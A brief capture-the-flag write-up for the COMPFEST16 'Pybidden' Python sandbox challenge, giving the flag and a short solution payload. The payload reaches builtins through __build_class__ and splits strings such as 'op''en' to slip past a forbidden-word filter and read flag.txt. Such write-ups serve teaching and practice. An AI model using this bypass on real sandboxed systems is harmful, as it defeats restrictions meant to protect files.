# Title
Pybidden (500 points)

# Flag
COMPFEST16{s0_m4nY_w4yS_t0_c4lL_a_fuNct1On_6fb7659705}

# Description
Pybidden: Python with forbidden function(s) Flag in **flag.txt**

```bash
nc challenges.ctf.compfest.id 20013
```

# Author
Zanark

# Solution
find the object attributes
```python
p = __build_class__.__self__.__dict__['pri''nt'] # get print function
f = __build_class__.__self__.__dict__['op''en']('fla''g.txt') # open flag.txt file
r = f.__getattribute__('re''ad') # get read function from the opened file

p(r())
```

references: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes